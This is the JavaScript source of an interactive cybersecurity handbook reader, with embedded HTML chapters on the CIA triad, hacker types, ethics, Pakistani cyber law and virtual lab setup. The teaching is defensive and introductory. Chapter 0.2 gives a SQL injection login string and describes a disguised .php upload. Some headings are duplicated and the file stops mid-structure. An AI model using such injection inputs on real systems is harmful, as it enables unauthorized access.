/* ============================================================
   Cyber Knights — Premium Interactive Book Reader v4.0
   Preserves the complete Academy Edition curriculum.
   ============================================================ */
(function () {
  "use strict";

  const $ = (selector, root = document) => root.querySelector(selector);
  const $$ = (selector, root = document) => Array.from(root.querySelectorAll(selector));

      const BOOK = {
    meta: {
      title: "Cyber Knights",
      subtitle: "Security Handbook",
      edition: "Academy Edition · v4.0",
      stats: { chapters: 49, parts: 8, access: "Free to read" },
    },
    sections: [
      // ============================================================
      // FRONT MATTER
      // ============================================================
      {
        id: "front",
        type: "matter",
        title: "Front Matter",
        icon: "📖",
        blurb: "Orientation for the reader — how this handbook is structured, how to navigate it, and the ethics that govern every lab you will run.",
        chapters: [
          { id: "fm-1", title: "Preface", pages: "i-iv", read: 4,
            build: "Understand the philosophy, scope, and audience of this handbook." },
          { id: "fm-2", title: "How to Use This Book", pages: "v-viii", read: 5,
            build: "Learn the module structure, reading order, and lab conventions." },
          { id: "fm-3", title: "Lab Safety, Ethics & Legal Boundaries", pages: "ix-xiv", read: 8,
            build: "Set up an isolated lab and sign the ethics charter before touching any tool." },
        ],
      },

      // ============================================================
      // MODULE 0 — ORIENTATION
      // ============================================================
      {
        id: "m0",
        type: "part",
        number: 0,
        title: "Orientation & Foundations",
        icon: "🧠",
        blurb: "Before you touch a single tool, you must understand what cyber security actually is, how attackers and defenders think, and the boundaries that separate a professional from a criminal.",
        chapters: [
                    { id: "0.1", title: "Cyber Security Fundamentals & The CIA Triad", pages: "1-10", read: 14,
            build: "Write a one-page definition that covers protection, detection, and response.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>Cybersecurity is the discipline of protecting systems, networks, programs, and data from digital attacks, damage, unauthorized access, and exploitation. It is not simply about learning how to hack — it is about understanding the complete cycle of security: how attacks happen, how to defend against them, and how to recover when defenses fail.</p>
                <p>At the foundation of every secure system lie three pillars — <strong>Confidentiality</strong>, <strong>Integrity</strong>, and <strong>Availability</strong> — collectively known as the <strong>CIA Triad</strong>. Every security control, every attack technique, and every defensive strategy can be traced back to one of these three pillars.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario</h3>
                <p>Imagine a personal bank account. It holds your money, your private information, and your ATM PIN. Now consider three scenarios:</p>
                <ul class="content-list">
                  <li><strong>Confidentiality breach:</strong> Someone observes your PIN. Your private data is exposed.</li>
                  <li><strong>Integrity breach:</strong> Someone alters a transaction amount — 5,000 becomes 500.</li>
                  <li><strong>Availability breach:</strong> An attacker floods the bank's website until it goes offline and customers cannot access their accounts.</li>
                </ul>
                <p>These three scenarios correspond precisely to the three pillars of the CIA Triad.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The CIA Triad in Depth</h3>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔐</span>
                    <h4>Confidentiality</h4>
                  </div>
                  <p><strong>Definition:</strong> Data is accessible only to authorized parties.</p>
                  <p><strong>Everyday analogy:</strong> Your private diary — only you should be able to read it.</p>
                  <p><strong>Real-world examples:</strong> ATM PINs, medical records, private messages.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Data breaches</li>
                        <li>Network sniffing</li>
                        <li>Phishing for credentials</li>
                        <li>Shoulder surfing</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Encryption (at rest &amp; in transit)</li>
                        <li>Strong password policies</li>
                        <li>Multi-Factor Authentication (MFA)</li>
                        <li>Access control lists</li>
                        <li>Virtual Private Networks (VPNs)</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🧱</span>
                    <h4>Integrity</h4>
                  </div>
                  <p><strong>Definition:</strong> Data remains accurate, complete, and unaltered by unauthorized parties.</p>
                  <p><strong>Everyday analogy:</strong> You send a message: "Send me 500 rupees." An attacker intercepts it and changes it to: "Send me 5,000 rupees." Integrity is broken.</p>
                  <p><strong>Real-world examples:</strong> Bank balances, exam grades, software updates.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Man-in-the-Middle (MITM) attacks</li>
                        <li>File tampering</li>
                        <li>Malware</li>
                        <li>Fake software updates</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Cryptographic hashing (SHA-256)</li>
                        <li>Digital signatures</li>
                        <li>Checksums</li>
                        <li>File integrity monitoring</li>
                      </ul>
                    </div>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">⚡</span>
                    <h4>Availability</h4>
                  </div>
                  <p><strong>Definition:</strong> Systems and data are accessible whenever authorized users need them.</p>
                  <p><strong>Everyday analogy:</strong> A bank's website must run 24/7. If an attacker takes it down, availability is lost.</p>
                  <p><strong>Real-world examples:</strong> Online banking, hospital systems, emergency services.</p>
                  <div class="cia-grid">
                    <div class="cia-attack">
                      <span class="cia-label attack">Attack Vectors</span>
                      <ul>
                        <li>Distributed Denial of Service (DDoS)</li>
                        <li>Ransomware</li>
                        <li>Server crashes</li>
                        <li>Physical damage</li>
                      </ul>
                    </div>
                    <div class="cia-defense">
                      <span class="cia-label defense">Defensive Controls</span>
                      <ul>
                        <li>Regular backups</li>
                        <li>Redundant systems</li>
                        <li>DDoS mitigation services</li>
                        <li>Load balancing</li>
                        <li>Disaster recovery planning</li>
                      </ul>
                    </div>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Attack Perspective vs Defense Perspective</h3>
                <div class="perspective-grid">
                  <div class="perspective-card attack">
                    <span class="perspective-tag">ATTACK PERSPECTIVE</span>
                    <p>An attacker asks: <em>Which pillar is weakest?</em></p>
                    <ul>
                      <li><strong>Confidentiality:</strong> Steal credentials</li>
                      <li><strong>Integrity:</strong> Modify data</li>
                      <li><strong>Availability:</strong> Disrupt service</li>
                    </ul>
                  </div>
                  <div class="perspective-card defense">
                    <span class="perspective-tag">DEFENSE PERSPECTIVE</span>
                    <p>A defender asks: <em>How do I protect all three?</em></p>
                    <ul>
                      <li>Encryption, MFA, access control</li>
                      <li>Hashing, signatures, monitoring</li>
                      <li>Backups, redundancy, DR planning</li>
                    </ul>
                    <p class="perspective-note">Adopt an <strong>"assume breach"</strong> mindset.</p>
                  </div>
                </div>
              </section>

              <figure class="content-figure">
                <img src="./img/cia-triad.png" alt="CIA Triad diagram — Confidentiality, Integrity, Availability" />
                <figcaption>Figure 1.1 — The CIA Triad: three pillars of information security. A breach occurs when any pillar is compromised.</figcaption>
              </figure>

              <section class="content-block">
                <h3 class="content-h">5. Ethics &amp; Legal Boundaries</h3>
                <p>Before attempting any security testing, you must understand the legal limits. Test only on:</p>
                <ul class="content-list">
                  <li>Your own computer and lab environment</li>
                  <li>Isolated virtual machines (VMs)</li>
                  <li>Systems for which you have explicit written permission</li>
                </ul>
                <p>Testing without permission — on any network, website, CCTV system, or device — is a crime, in Pakistan and everywhere else. An <strong>ethical hacker</strong> is one who tests only with written authorization and within an agreed scope.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Cybersecurity is about protecting, detecting, and responding — not just hacking.</li>
                  <li>The CIA Triad — <strong>Confidentiality, Integrity, Availability</strong> — is the foundation of all security work.</li>
                  <li>Attackers target the weakest pillar; defenders protect all three.</li>
                  <li>Every tool and technique maps back to one of the three pillars.</li>
                  <li>Ethics and permission are non-negotiable. Always test in an isolated lab.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe — Interactive security labs</a>
                  <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box — CTF-style practice</a>
                  <a href="https://owasp.org/" target="_blank" rel="noopener">OWASP — Open Web Application Security Project</a>
                  <a href="https://www.nist.gov/cyberframework" target="_blank" rel="noopener">NIST Cybersecurity Framework</a>
                </div>
              </section>
            ` },
                    { id: "0.2", title: "Hacker Mindset, Ethics & Legal Boundaries", pages: "11-20", read: 15,
            build: "Draft a written scope-of-work agreement for a fictional penetration test.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>The <strong>hacker mindset</strong> is a structured way of thinking in which an individual continuously looks for weaknesses, loopholes, and unexpected behaviors in systems, networks, and human processes — not to cause harm, but to understand how things can be broken and how they can then be secured.</p>
                <p><strong>Ethics in cybersecurity</strong> refers to the moral principles and professional code of conduct that guide a security professional to use their skills only for authorized, legal, and constructive purposes. <strong>Legal boundaries</strong> are the laws that define what is considered a cybercrime and what is considered authorized security testing. Together, these three pillars — mindset, ethics, and law — separate a professional from a criminal.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Scenario</h3>
                <p>Imagine your school has a locked cupboard containing final exam papers. Consider four people who approach that cupboard differently:</p>
                <ul class="content-list">
                  <li><strong>Black Hat Hacker</strong> — breaks the lock, steals the papers, and sells them. This is a crime.</li>
                  <li><strong>White Hat Hacker</strong> — informs the school that the lock is weak, then — with written permission — tests it, demonstrates the flaw, and helps fix it. This is ethical hacking.</li>
                  <li><strong>Grey Hat Hacker</strong> — breaks the lock, takes nothing, but emails the school: "Your lock is weak. Pay me and I will tell you how to fix it." This sits in a legal grey area and is often illegal.</li>
                  <li><strong>Script Kiddie</strong> — downloads a lock-picking tool from the internet and tries it without understanding how it works. This is the most dangerous position because the person has no idea what they are doing.</li>
                </ul>
                <p>The mindset may be similar, but <em>ethics and permission</em> separate these four categories.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. The Hacker Mindset — Five Core Questions</h3>
                <p>Every hacker — offensive or defensive — runs through the same five questions:</p>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔍</span>
                    <h4>1. "How does this thing work?"</h4>
                  </div>
                  <p>Before breaking anything, understand it. A mechanic opens the engine before repairing it. A hacker studies the system's components, data flow, and trust boundaries before touching anything.</p>
                  <p><strong>Example:</strong> On a login page — Where is the password stored? What database is used? How is the query built? Is the input validated?</p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔍</span>
                    <h4>2. "Where can this fail?"</h4>
                  </div>
                  <p>A normal user does what the interface suggests. A hacker does what the developer never imagined. Edge cases, malformed inputs, race conditions — these are the fertile ground of exploitation.</p>
                  <p><strong>Example:</strong> Entering <code>admin' OR '1'='1</code> in a login form. This is the basic idea behind SQL Injection.</p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔍</span>
                    <h4>3. "How can this be misused?"</h4>
                  </div>
                  <p>Every legitimate feature is also a potential weapon. A file upload feature designed for profile pictures can become a remote code execution vector.</p>
                  <p><strong>Example:</strong> A developer allows only "images." A hacker uploads a <code>.php</code> file renamed as <code>.jpg</code> — and executes it on the server.</p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔍</span>
                    <h4>4. "Where does trust break?"</h4>
                  </div>
                  <p>Systems are chains of trust. Every link is a potential vulnerability. A company trusts its employee's laptop. If malware infects that laptop, the entire company is exposed.</p>
                  <p><strong>Example:</strong> Trust-chain attacks — supply chain compromise, third-party vendor breaches, or credential theft on an endpoint.</p>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🔍</span>
                    <h4>5. "How can I hide?"</h4>
                  </div>
                  <p>Attackers conceal their identity using VPNs, proxies, Tor, MAC spoofing, IP spoofing, and log manipulation. For defenders, this is the hardest part of the chase — attribution.</p>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Types of Hackers</h3>

                              <section class="content-block">
                <h3 class="content-h">4. Types of Hackers</h3>

                <figure class="content-figure">
                  <img src="./img/hacker-types.png" alt="Types of hackers — legal, grey area, and illegal spectrum" />
                  <figcaption>Figure 2.1 — Same skills, different ethics. Hacker categories span a legal spectrum from authorized testing to malicious activity.</figcaption>
                </figure>


                <div class="type-grid">
                  <div class="type-card white">
                    <span class="type-dot">⚪</span>
                    <h4>White Hat Hacker</h4>
                    <p><strong>Definition:</strong> An authorized security professional who tests systems only with written permission.</p>
                    <p><strong>Work:</strong> Penetration testing, vulnerability assessment, bug bounty.</p>
                    <p><strong>Legal status:</strong> Fully legal.</p>
                    <p><strong>Typical titles:</strong> Ethical Hacker, Penetration Tester, Security Analyst.</p>
                  </div>

                  <div class="type-card black">
                    <span class="type-dot">⚫</span>
                    <h4>Black Hat Hacker</h4>
                    <p><strong>Definition:</strong> An unauthorized attacker who exploits systems for illegal gain.</p>
                    <p><strong>Work:</strong> Data theft, ransomware, fraud, extortion.</p>
                    <p><strong>Legal status:</strong> Criminal offense.</p>
                    <p><strong>Typical titles:</strong> Cracker, Malicious Hacker.</p>
                  </div>

                  <div class="type-card grey">
                    <span class="type-dot">⚪⚫</span>
                    <h4>Grey Hat Hacker</h4>
                    <p><strong>Definition:</strong> Neither fully ethical nor fully criminal.</p>
                    <p><strong>Work:</strong> Tests without permission but without harmful intent.</p>
                    <p><strong>Legal status:</strong> Grey area — often still illegal.</p>
                    <p><strong>Risk:</strong> Legal action is possible even with good intent.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">🎭</span>
                    <h4>Hacktivist</h4>
                    <p><strong>Definition:</strong> A hacker who attacks for a political or social message.</p>
                    <p><strong>Work:</strong> Website defacement, data leaks, DDoS campaigns.</p>
                    <p><strong>Legal status:</strong> Illegal, despite political motive.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">💰</span>
                    <h4>Cyber Criminal</h4>
                    <p><strong>Definition:</strong> An organized crime group attacking for money.</p>
                    <p><strong>Work:</strong> Ransomware, banking fraud, card theft.</p>
                    <p><strong>Example:</strong> Ransomware gangs such as REvil, LockBit.</p>
                    <p><strong>Legal status:</strong> Serious criminal offense.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">🧒</span>
                    <h4>Script Kiddie</h4>
                    <p><strong>Definition:</strong> A beginner who uses ready-made tools without understanding them.</p>
                    <p><strong>Work:</strong> Launches attacks with tools like LOIC or Kali scripts.</p>
                    <p><strong>Risk:</strong> Faces the same legal consequences as a professional attacker.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">🕵️</span>
                    <h4>Insider Threat</h4>
                    <p><strong>Definition:</strong> An employee attacking their own organization from within.</p>
                    <p><strong>Work:</strong> Data theft, sabotage, planting backdoors.</p>
                    <p><strong>Defense:</strong> Background checks, least privilege, continuous monitoring.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">🎩</span>
                    <h4>Red Hat Hacker</h4>
                    <p><strong>Definition:</strong> A white hat who actively targets black hat hackers.</p>
                    <p><strong>Work:</strong> Vigilante justice, active defense.</p>
                    <p><strong>Legal status:</strong> Often illegal, even with defensive intent.</p>
                  </div>

                  <div class="type-card">
                    <span class="type-dot">🔵</span>
                    <h4>Blue Hat Hacker</h4>
                    <p><strong>Definition:</strong> A security professional who works on the defender's side.</p>
                    <p><strong>Work:</strong> SOC operations, incident response, threat hunting.</p>
                    <p><strong>Focus:</strong> Defense, detection, response.</p>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Ethics in Cybersecurity</h3>
                <p>Ethics means: <em>Your skill is your power. How you use it is your choice — but so is the responsibility.</em></p>

                <h4 class="sub-h">The Five Rules of Ethical Hacking</h4>
                <ol class="content-ordered">
                  <li><strong>Authorization</strong> — Never test a system without written permission.</li>
                  <li><strong>Scope</strong> — Test only what has been agreed. Nothing extra.</li>
                  <li><strong>Confidentiality</strong> — Any data discovered stays private. No leaks.</li>
                  <li><strong>No Damage</strong> — Do not destroy, alter, or delete any data.</li>
                  <li><strong>Responsible Disclosure</strong> — Report vulnerabilities privately to the owner first.</li>
                </ol>

                <h4 class="sub-h">Responsible Disclosure Process</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Discover the vulnerability</div>
                  <div class="step-item"><span class="step-num">2</span> Report privately to the organization</div>
                  <div class="step-item"><span class="step-num">3</span> Allow a fix window (typically 90 days)</div>
                  <div class="step-item"><span class="step-num">4</span> Public disclosure only after the fix</div>
                  <div class="step-item"><span class="step-num">5</span> Follow the organization's disclosure policy</div>
                </div>

                <h4 class="sub-h">Bug Bounty Programs</h4>
                <p>Companies pay researchers to find and report bugs responsibly. This is a fully legal career path.</p>
                <div class="reading-list">
                  <a href="https://www.hackerone.com/" target="_blank" rel="noopener">HackerOne</a>
                  <a href="https://www.bugcrowd.com/" target="_blank" rel="noopener">Bugcrowd</a>
                  <a href="https://www.yeswehack.com/" target="_blank" rel="noopener">YesWeHack</a>
                  <a href="https://www.openbugbounty.org/" target="_blank" rel="noopener">Open Bug Bounty</a>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Legal Boundaries</h3>

                <h4 class="sub-h">Pakistan — PECA 2016</h4>
                <p>The <strong>Prevention of Electronic Crimes Act, 2016</strong> is the primary cyber-crime law in Pakistan. Key sections include:</p>
                <div class="law-grid">
                  <div class="law-item"><span class="law-num">§3</span> Unauthorized access to an information system</div>
                  <div class="law-item"><span class="law-num">§4</span> Unauthorized copying or transmission of data</div>
                  <div class="law-item"><span class="law-num">§5</span> Interference with an information system</div>
                  <div class="law-item"><span class="law-num">§6</span> Interference with data</div>
                  <div class="law-item"><span class="law-num">§7</span> Unauthorized access to critical infrastructure</div>
                  <div class="law-item"><span class="law-num">§8</span> Cyber terrorism</div>
                  <div class="law-item"><span class="law-num">§13</span> Unauthorized use of identity information</div>
                  <div class="law-item"><span class="law-num">§16</span> Malicious code</div>
                  <div class="law-item"><span class="law-num">§17</span> Unauthorized interception</div>
                  <div class="law-item"><span class="law-num">§21</span> Defamation</div>
                </div>
                <p><strong>Penalties:</strong> Fines, imprisonment, or both. Serious offenses can carry 3–7 years of imprisonment.</p>

                <h4 class="sub-h">FIA Cyber Crime Wing</h4>
                <p>Reports can be filed with the Federal Investigation Agency's Cyber Crime Wing.</p>
                <div class="reading-list">
                  <a href="https://www.fia.gov.pk/" target="_blank" rel="noopener">FIA Cyber Crime — Official Portal</a>
                </div>
                <p><strong>Helpline:</strong> 1991</p>

                <h4 class="sub-h">International Frameworks</h4>
                <ul class="content-list">
                  <li><strong>CFAA</strong> — Computer Fraud and Abuse Act (United States)</li>
                  <li><strong>GDPR</strong> — General Data Protection Regulation (Europe)</li>
                  <li><strong>HIPAA</strong> — Health Insurance Portability and Accountability Act (United States)</li>
                  <li><strong>PCI DSS</strong> — Payment Card Industry Data Security Standard</li>
                  <li><strong>ISO 27001</strong> — Information Security Management Standard</li>
                </ul>

                <h4 class="sub-h">Documents Required for Legal Testing</h4>
                <ul class="content-list">
                  <li><strong>Written Permission</strong> — A signed authorization from the organization</li>
                  <li><strong>Scope Document</strong> — What is and is not to be tested</li>
                  <li><strong>NDA</strong> — Non-Disclosure Agreement</li>
                  <li><strong>Rules of Engagement</strong> — When, how, and how much to test</li>
                  <li><strong>Emergency Contact</strong> — Who to call if something breaks</li>
                </ul>
                <p><strong>Without these documents, any testing is illegal — regardless of intent.</strong></p>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Lab Safety</h3>

                <h4 class="sub-h">Why a Safe Lab Is Mandatory</h4>
                <p>Running attack tools on a home Wi-Fi network can:</p>
                <ul class="content-list">
                  <li>Disrupt your own internet connection</li>
                  <li>Trigger action from your ISP</li>
                  <li>Affect neighboring networks</li>
                  <li>Lead to legal consequences</li>
                </ul>
                <p>Running SQL Injection against any website without permission is a criminal offense — regardless of your intent.</p>

                <h4 class="sub-h">Building a Safe Lab</h4>
                <div class="lab-options">
                  <div class="lab-option">
                    <span class="lab-tag">Option 1 · Recommended</span>
                    <h5>Virtual Machines</h5>
                    <p>Run an isolated lab entirely on your computer.</p>
                    <ul>
                      <li>VirtualBox or VMware Workstation Player</li>
                      <li>Kali Linux VM (attacker)</li>
                      <li>Windows / Metasploitable VM (victim)</li>
                      <li>Host-Only network for full isolation</li>
                    </ul>
                  </div>
                  <div class="lab-option">
                    <span class="lab-tag">Option 2 · No Setup Required</span>
                    <h5>Cloud Labs</h5>
                    <p>Browser-based remote labs with pre-built environments.</p>
                    <ul>
                      <li>TryHackMe</li>
                      <li>Hack The Box</li>
                      <li>PentesterLab</li>
                      <li>PortSwigger Web Security Academy</li>
                    </ul>
                  </div>
                  <div class="lab-option">
                    <span class="lab-tag">Option 3 · Advanced</span>
                    <h5>Physical Home Lab</h5>
                    <p>Real hardware, isolated network, full control.</p>
                    <ul>
                      <li>Old laptop / desktop as server</li>
                      <li>Managed switch for VLANs</li>
                      <li>Raspberry Pi for monitoring</li>
                      <li>Vulnerable VMs to attack</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Golden Rules of Lab Safety</h4>
                <ul class="content-list takeaways">
                  <li><strong>Isolation</strong> — Lab network must be fully separate from any production network.</li>
                  <li><strong>No Real Targets</strong> — Only attack intentionally vulnerable VMs.</li>
                  <li><strong>Snapshots</strong> — Snapshot before every experiment.</li>
                  <li><strong>No Personal Data</strong> — Never store real personal or financial data.</li>
                  <li><strong>Legal Awareness</strong> — Know the laws that apply in your country.</li>
                  <li><strong>Log Everything</strong> — Keep a written record of every test.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>The hacker mindset is about finding weaknesses constructively — not exploiting them maliciously.</li>
                  <li>White Hat is legal, Black Hat is criminal, Grey Hat sits in a legal grey area.</li>
                  <li>Ethics rests on five pillars: authorization, scope, confidentiality, no damage, and responsible disclosure.</li>
                  <li>In Pakistan, PECA 2016 is the primary cyber-crime law. FIA Cyber Crime Wing handles enforcement.</li>
                  <li>Testing without written permission is a crime, regardless of intent.</li>
                  <li>A lab must be isolated and legal — never practice on real systems.</li>
                  <li>Bug bounty platforms offer a fully legal path to earn from security research.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.fia.gov.pk/" target="_blank" rel="noopener">FIA Cyber Crime Wing — Pakistan</a>
                  <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe — Interactive security labs</a>
                  <a href="https://www.hackerone.com/" target="_blank" rel="noopener">HackerOne — Bug Bounty Platform</a>
                  <a href="https://owasp.org/" target="_blank" rel="noopener">OWASP — Web Application Security</a>
                  <a href="https://www.sans.org/" target="_blank" rel="noopener">SANS Institute — Professional Training</a>
                </div>
              </section>
            ` },
                    { id: "0.3", title: "Lab Setup & Career Roadmap", pages: "21-30", read: 12,
            build: "Build an isolated lab and outline a 6-month career development plan.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>lab</strong> is an isolated, controlled, and legal computing environment where security professionals practice offensive and defensive techniques without affecting real systems, networks, or people.</p>
                <p><strong>Career paths in cybersecurity</strong> are the structured professional routes an individual can take to specialize in different domains — from Security Operations and Penetration Testing to Incident Response, Malware Analysis, Security Architecture, and Governance.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>A medical student does not perform surgery on a real patient on day one. They practice on cadavers, simulations, and supervised environments.</p>
                <p>A pilot logs hundreds of hours in a flight simulator before ever flying a real aircraft.</p>
                <p>In the same way, a cybersecurity student must practice on virtual machines, isolated networks, and intentionally vulnerable applications before touching any production system.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Why You Need a Lab</h3>
                <p>Without a lab, you will inevitably:</p>
                <ul class="content-list">
                  <li>Break your own computer or home network</li>
                  <li>Accidentally attack a neighbor's Wi-Fi or your ISP's equipment</li>
                  <li>Commit a crime by testing a system you do not own</li>
                  <li>Learn nothing, because you were afraid to experiment</li>
                </ul>
                <p>A proper lab gives you:</p>
                <ul class="content-list takeaways">
                  <li><strong>Safety</strong> — Mistakes harm no one.</li>
                  <li><strong>Freedom</strong> — Break things and rebuild them.</li>
                  <li><strong>Repeatability</strong> — Snapshot and restore at will.</li>
                  <li><strong>Legality</strong> — No laws are being broken.</li>
                  <li><strong>Observability</strong> — Inspect every packet, log, and process.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Types of Labs</h3>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">💻</span>
                    <h4>A. Virtual Machine Lab</h4>
                  </div>
                  <p>The recommended starting point. A <strong>hypervisor</strong> allows you to run multiple operating systems simultaneously as virtual machines (VMs).</p>
                  <p><strong>Components:</strong></p>
                  <ul class="content-list">
                    <li><strong>Host Machine</strong> — Your physical computer</li>
                    <li><strong>Hypervisor</strong> — VirtualBox, VMware, Hyper-V, KVM</li>
                    <li><strong>Guest VMs</strong> — Kali Linux (attacker), Windows (victim), Metasploitable (target)</li>
                  </ul>
                  <p><strong>Network Modes in VirtualBox:</strong></p>
                  <ul class="content-list">
                    <li><strong>NAT</strong> — VM can access the internet but cannot be accessed from outside</li>
                    <li><strong>Bridged</strong> — VM receives an IP from your router, appears as a separate device</li>
                    <li><strong>Host-Only</strong> — VMs communicate with each other and the host, but not the internet (best for offensive practice)</li>
                    <li><strong>Internal Network</strong> — VMs communicate only with each other (most isolated)</li>
                  </ul>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">☁️</span>
                    <h4>B. Cloud-Based Lab</h4>
                  </div>
                  <p>Nothing is installed locally. You access a remote lab through a browser.</p>
                  <p><strong>Advantages:</strong> No powerful hardware required, pre-configured environments, guided learning paths, fully legal and isolated.</p>
                  <p><strong>Disadvantages:</strong> Subscription cost, less control, internet dependency.</p>
                  <p><strong>Platforms:</strong></p>
                  <div class="reading-list">
                    <a href="https://tryhackme.com/" target="_blank" rel="noopener">TryHackMe</a>
                    <a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box</a>
                    <a href="https://pentesterlab.com/" target="_blank" rel="noopener">PentesterLab</a>
                    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a>
                  </div>
                </div>

                <div class="cia-card">
                  <div class="cia-card-head">
                    <span class="cia-icon">🖥️</span>
                    <h4>C. Physical Home Lab</h4>
                  </div>
                  <p>Old computers, routers, switches, and cables assemble into a real network.</p>
                  <p><strong>Components:</strong> Old desktop as server, router with DD-WRT/OpenWRT, managed switch for VLANs, Raspberry Pi for monitoring, network taps.</p>
                  <p><strong>Advantages:</strong> Real hardware experience, full control, physical-layer learning.</p>
                  <p><strong>Disadvantages:</strong> Expensive, noisy, high power consumption, requires space.</p>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Step-by-Step Virtual Lab Setup</h3>

                              <figure class="content-figure">
                <img src="./img/isolated-lab.png" alt="Isolated virtual lab with Kali Linux attacker, Windows victim, Metasploitable target, and Security Onion monitoring" />
                <figcaption>Figure 3.1 — A safe isolated lab. The attacker VM, victim VM, and vulnerable target run on a Host-Only network, fully separate from production. NAT is used only for updates.</figcaption>
              </figure>

              <section class="content-block">
                <h3 class="content-h">6. Essential Lab Tools</h3>

                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span>
                    <div>
                      <strong>Install a Hypervisor</strong>
                      <p>Download <a href="https://www.virtualbox.org/" target="_blank" rel="noopener">VirtualBox</a> or <a href="https://www.vmware.com/products/workstation-player.html" target="_blank" rel="noopener">VMware Workstation Player</a>.</p>
                    </div>
                  </div>
                  <div class="step-item"><span class="step-num">2</span>
                    <div>
                      <strong>Download Kali Linux</strong>
                      <p>Visit <a href="https://www.kali.org/get-kali/" target="_blank" rel="noopener">kali.org/get-kali</a>, choose "Virtual Machines," and import the .ova file.</p>
                    </div>
                  </div>
                  <div class="step-item"><span class="step-num">3</span>
                    <div>
                      <strong>Download a Victim VM</strong>
                      <p>Choose one: <a href="https://docs.rapid7.com/metasploit/metasploitable-2/" target="_blank" rel="noopener">Metasploitable 2</a>, <a href="https://dvwa.co.uk/" target="_blank" rel="noopener">DVWA</a>, or <a href="https://owasp.org/www-project-juice-shop/" target="_blank" rel="noopener">OWASP Juice Shop</a>.</p>
                    </div>
                  </div>
                  <div class="step-item"><span class="step-num">4</span>
                    <div>
                      <strong>Configure Network</strong>
                      <p>Set both VMs to "Host-Only Adapter." They will be on an isolated network. Add a second adapter set to NAT on Kali for tool downloads only.</p>
                    </div>
                  </div>
                  <div class="step-item"><span class="step-num">5</span>
                    <div>
                      <strong>Take Snapshots</strong>
                      <p>Before every experiment, take a snapshot. Restore instantly if something breaks.</p>
                    </div>
                  </div>
                  <div class="step-item"><span class="step-num">6</span>
                    <div>
                      <strong>Start Practicing</strong>
                      <p>Scan with Nmap, capture with Wireshark, exploit with Metasploit, intercept with Burp Suite.</p>
                    </div>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Essential Lab Tools</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header">
                    <span>Tool</span><span>Purpose</span><span>Link</span>
                  </div>
                  <div class="tool-row"><span>VirtualBox</span><span>Hypervisor</span><a href="https://www.virtualbox.org/" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Kali Linux</span><span>Attacker OS</span><a href="https://www.kali.org/" target="_blank" rel="noopener">Download</a></div>
                  <div class="tool-row"><span>Metasploitable 2</span><span>Vulnerable target</span><a href="https://docs.rapid7.com/metasploit/metasploitable-2/" target="_blank" rel="noopener">Download</a></div>
